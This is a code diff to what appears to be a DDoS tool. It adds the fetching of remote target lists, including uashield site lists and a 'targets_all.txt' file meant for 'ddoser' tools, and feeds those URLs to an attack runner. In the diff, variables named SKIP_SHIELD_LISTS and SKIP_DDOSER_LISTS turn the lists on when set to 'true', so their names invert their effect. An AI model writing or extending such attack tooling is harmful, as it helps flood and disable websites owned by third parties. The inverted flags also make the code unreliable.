@@ -11,10 +11,17 @@ const { runner } = require('./runner')
 // interval between printing stats and calculating error rate
 const logInterval = 60 * 1000
 const urlsPoolInterval = 15 * 60 * 1000
-const sitesUrls = [
-  'https://raw.githubusercontent.com/opengs/uashieldtargets/v2/sites.json',
-  'https://raw.githubusercontent.com/mgrybyk/uasword/master/data/sites.json',
-]
+const sitesUrls =
+  process.env.SKIP_SHIELD_LISTS === 'true'
+    ? [
+        'https://raw.githubusercontent.com/opengs/uashieldtargets/v2/sites.json',
+        'https://raw.githubusercontent.com/mgrybyk/uasword/master/data/sites.json',
+      ]
+    : []
+const sitesPlainListUrls =
+  process.env.SKIP_DDOSER_LISTS === 'true'
+    ? ['https://raw.githubusercontent.com/hem017/cytro/master/targets_all.txt']
+    : []
 
 const main = async () => {
   const eventEmitter = new EventEmitter()
@@ -106,6 +113,19 @@ const getSites = async ({ ignoreError = false } = {}) => {
         assert(typeof res.data[0].page === 'string')
       }
       urlList.push(...res.data.map((x) => x.page))
+    } catch (err) {
+      if (ignoreError) {
+        console.log(new Date().toISOString(), 'WARN: Failed to get new urls list from', sitesUrl)
+      }
+      throw err
+    }
+  }
+
+  for (const sitesUrl of sitesPlainListUrls) {
+    try {
+      const res = await axios.get(sitesUrl)
+      assert(typeof res.data === 'string')
+      urlList.push(...res.data.split('\n').filter((s) => s.startsWith('http')))
     } catch (err) {
       if (ignoreError) {
         console.log(new Date().toISOString(), 'WARN: Failed to get new urls list from', sitesUrl)
